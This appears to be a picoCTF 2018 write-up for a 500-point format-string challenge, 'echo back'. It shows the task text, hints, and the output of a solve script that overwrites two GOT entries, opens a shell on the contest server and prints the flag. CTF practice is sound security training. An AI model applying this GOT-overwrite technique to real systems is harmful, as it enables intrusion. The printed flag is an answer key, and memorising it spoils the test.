# echo back - Points: 500 - (Solves: 143)

This [program][1] we found seems to have a vulnerability.
Can you get a shell and retreive the flag?
Connect to it with nc 2018shell2.picoctf.com 37402.

[1]: https://2018shell2.picoctf.com/static/1f45696a25c8f532dacfd136349b2e7d/echoback

## Hints

- hmm, printf seems to be dangerous...
- You may need to modify more than one address at once.
- Ever heard of the Global Offset Table?

---

Format string:

```sh
$ py solve.py REMOTE
[*] '/home/zzzz/pico18/pwn/echo-back/echoback'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] Trying to write:
    0x804a010 : 0x8048460
    0x804a01c : 0x80485ab
[+] Opening connection to 2018shell2.picoctf.com on port 37402: Done
[+] Here're your shell!
[*] Switching to interactive mode
total 76
drwxr-x---   2 hacksports echo-back_0  4096 Sep 28 07:45 .
drwxr-x--x 576 root       root        53248 Sep 30 03:50 ..
-rwxr-sr-x   1 hacksports echo-back_0  7684 Sep 28 07:45 echoback
-rw-rw-r--   1 hacksports hacksports    364 Sep 28 07:45 echoback.c
-r--r-----   1 hacksports echo-back_0    54 Sep 28 07:45 flag.txt
-rwxr-sr-x   1 hacksports echo-back_0   116 Sep 28 07:45 xinet_startup.sh
$ cat flag.txt
picoCTF{foRm4t_stRinGs_aRe_3xtra_DanGer0us_ee5a92ac}
```
